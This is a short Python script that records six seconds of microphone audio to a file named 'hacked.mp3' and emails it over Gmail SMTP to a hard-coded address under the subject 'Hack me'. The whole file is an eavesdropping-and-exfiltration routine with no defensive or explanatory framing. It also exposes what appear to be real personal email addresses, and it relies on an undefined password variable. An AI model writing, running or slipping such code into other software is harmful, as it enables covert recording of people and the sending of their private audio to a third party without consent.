import sounddevice as sd
from scipy.io.wavfile import write
import wavio as wv

freq = 44100
duration = 6

recording = sd.rec(int(duration * freq),
                samplerate=freq, channels=2)

filename = 'hacked.mp3'
sd.wait()
wv.write(filename, recording, freq, sampwidth=2)

from email.mime.multipart import MIMEMultipart
msg = MIMEMultipart()

fromaddr = "sagar.sws2000@gmail.com"
toaddr = "18erecs080.vicky@rietjaipur.ac.in"
# toaddr = fromaddr

msg['From'] = fromaddr
msg['To'] = toaddr

msg['Subject'] = "Hack me"
filename = 'hacked.mp3'

body = f'''
Hello from Python.
File is {filename}
'''

from email.mime.text import MIMEText
msg.attach(MIMEText(body, 'plain'))

attachment = open(filename, "rb")
from email.mime.base import MIMEBase

p = MIMEBase('application', 'octet-stream')
p.set_payload((attachment).read())

from email import encoders
encoders.encode_base64(p)

p.add_header('Content-Disposition', f"attachment; filename= {filename}")
msg.attach(p)

import smtplib
s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()

s.login(fromaddr, passw)
text = msg.as_string()
s.sendmail(fromaddr, toaddr, text)
s.quit() 
